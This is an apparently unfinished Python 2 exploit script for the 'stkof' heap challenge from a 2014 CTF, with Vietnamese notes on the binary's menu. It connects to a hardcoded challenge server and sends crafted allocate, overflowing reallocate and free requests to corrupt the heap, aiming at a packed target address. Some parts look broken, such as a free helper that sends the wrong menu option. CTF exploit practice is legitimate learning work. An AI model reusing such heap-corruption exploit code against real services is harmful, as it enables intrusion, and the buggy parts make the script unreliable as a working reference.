__author__ = 'HuyNA'
'''
stkof
Description
nc 54.64.45.35 3573

https://github.com/hitcon2014ctf/ctf/raw/master/a679df07a8f3a8d590febad45336d031-stkof

Hint


option1
    nhan vao kich thuoc,
    tao 1 buffer roi day vao mang buffer

option2
    nhan 1 so kich thuoc <= 0x100000 => so thu tu trong g_s
    thay doi kich thuoc cua 1 g_s

option3
    free 1 phan tu cua g_s theo index duoc nhap vao



'''

import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
# nc 210.61.8.96 51342
local_host="54.64.45.35"
#local_host='192.168.248.176'
local_port = 3573
time.sleep(0.01)

def alloc_(size):
    print '[+] alloc ...'
    s.send('1\n')
    time.sleep(0.001)
    s.send(size)
    time.sleep(0.001)
    print recv_until(s,'OK\n')

def realloc_(index,size,string):
    print '[+] realloc ...'
    s.send('2\n')
    time.sleep(0.001)
    s.send(index)
    time.sleep(0.001)
    s.send(size)
    time.sleep(0.001)
    s.send(string)
    time.sleep(0.001)
    print recv_until(s,'OK\n')

def free_(index):
    print '[+] free ...'
    s.send('1\n')
    time.sleep(0.001)
    s.send(index)
    time.sleep(0.001)
    print recv_until(s,'OK\n')


def alloc(size):
    print '[+] alloc ...'
    mes = '1\n'
    time.sleep(0.001)
    mes+=size
    time.sleep(0.001)
    return mes

def realloc(index,size,string):
    print '[+] realloc ...'
    mes='2\n'
    time.sleep(0.001)
    mes+=index
    time.sleep(0.001)
    mes+=size
    time.sleep(0.001)
    mes+=string
    time.sleep(0.001)
    return mes

def free(index):
    print '[+] free ...'
    mes='3\n'
    time.sleep(0.001)
    mes+=index
    time.sleep(0.001)
    return mes

message=alloc('8\n')
message+=alloc('8\n')
message+=alloc('8\n')

buffer = 16*'2'+16*'3'
message+=realloc('1\n','33\n',buffer+'\n')
message+=free('2\n')

print 0x140*'a'+struct.pack('<Q',0x0000000000602038)
print message
time.sleep(0.1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((local_host,local_port))
s.send(message)
time.sleep(0.01)
s.recv(2000)
s.recv(2000)
s.recv(2000)
s.recv(2000)
s.recv(2000)